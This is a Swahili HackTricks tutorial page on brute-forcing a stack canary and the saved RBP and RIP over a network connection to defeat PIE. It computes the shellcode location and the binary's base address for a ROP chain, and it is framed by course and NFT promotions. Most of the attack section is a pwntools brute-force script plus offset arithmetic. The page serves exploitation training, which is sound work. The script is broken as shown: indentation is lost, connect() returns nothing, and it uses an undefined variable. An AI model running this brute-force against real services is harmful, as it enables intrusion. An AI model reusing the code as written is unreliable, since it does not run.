# Anwani za BF kwenye Stack

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

**Ikiwa unakabiliana na binary iliyolindwa na canary na PIE (Position Independent Executable) labda unahitaji kupata njia ya kuzipuuza.**

![](<../../../.gitbook/assets/image (862).png>)

{% hint style="info" %}
Tambua kwamba **`checksec`** inaweza isigundue kuwa binary imekingwa na canary ikiwa ilikompiliwa kistatiki na haiwezi kutambua kazi.\
Hata hivyo, unaweza kugundua hii kwa mikono ikiwa unagundua kwamba thamani imesave kwenye stack mwanzoni mwa wito wa kazi na thamani hii inachunguzwa kabla ya kutoka.
{% endhint %}

## Anwani za Brute-Force

Ili kuzipuuza PIE unahitaji **kuvuja anwani fulani**. Na ikiwa binary haivuji anwani yoyote njema ni **kupuuza RBP na RIP zilizohifadhiwa kwenye stack** katika kazi yenye kasoro.\
Kwa mfano, ikiwa binary inalindwa kwa kutumia **canary** na **PIE**, unaweza kuanza kuvunja nguvu canary, kisha **baadaye** Byte 8 (x64) itakuwa **RBP** iliyohifadhiwa na Byte 8 inayofuata itakuwa **RIP** iliyohifadhiwa.

{% hint style="success" %}
Inatarajiwa kwamba anwani ya kurudi kwenye stack inamilikiwa na msimbo wa binary kuu, ambao, ikiwa kasoro iko kwenye msimbo wa binary, kawaida itakuwa hivyo.
{% endhint %}

Kupuuza RBP na RIP kutoka kwa binary unaweza kugundua kwamba byte sahihi iliyoguessed ni sahihi ikiwa programu inatoa kitu au tu haivunjiki. **Kazi ile ile** kama iliyotolewa kwa kuvunja nguvu canary inaweza kutumika kwa kuvunja nguvu RBP na RIP:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
Kitu cha mwisho unachohitaji kushinda PIE ni kuhesabu **anwani muhimu kutoka kwa anwani zilizovuja**: **RBP** na **RIP**.

Kutoka kwa **RBP** unaweza kuhesabu **eneo ambapo unaiandika shel yako kwenye steki**. Hii inaweza kuwa muhimu sana kujua mahali utakapoiandika herufi _"/bin/sh\x00"_ ndani ya steki. Kuhesabu umbali kati ya RBP iliyovuja na shellcode yako unaweza tu kuweka **kituo cha kusitisha baada ya kuvuja RBP** na kuangalia **eneo ambapo shellcode yako iko**, kisha, unaweza kuhesabu umbali kati ya shellcode na RBP:
```python
INI_SHELLCODE = RBP - 1152
```
Kutoka kwa **RIP** unaweza kuhesabu **anwani ya msingi ya faili ya PIE** ambayo ndio utahitaji kuunda **mtandao wa ROP halali**.\
Kuhesabu anwani ya msingi fanya `objdump -d vunbinary` na angalia anwani za hivi karibuni zilizochambuliwa:

![](<../../../.gitbook/assets/image (476).png>)

Katika mfano huo unaweza kuona kwamba **Byte 1 na nusu tu inahitajika** kutambua msimbo wote, basi, anwani ya msingi katika hali hii itakuwa **RIP iliyovuja lakini ikimalizika kwa "000"**. Kwa mfano ikiwa ulivuja `0x562002970ecf` anwani ya msingi itakuwa `0x562002970000`
```python
elf.address = RIP - (RIP & 0xfff)
```
## Maboresho

Kulingana na [**baadhi ya uchunguzi kutoka kwenye chapisho hili**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking), inawezekana kwamba wakati data ya RBP na RIP inavuja, server haitaanguka na baadhi ya data ambazo sio sahihi na script ya BF itadhani amepata zile sahihi. Hii ni kwa sababu inawezekana kwamba **baadhi ya anwani hazitavunja hata kama sio zile sahihi kabisa**.

Kulingana na chapisho hilo la blogu, inashauriwa kuongeza kuchelewesha fupi kati ya maombi kwa server inayoingizwa.

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
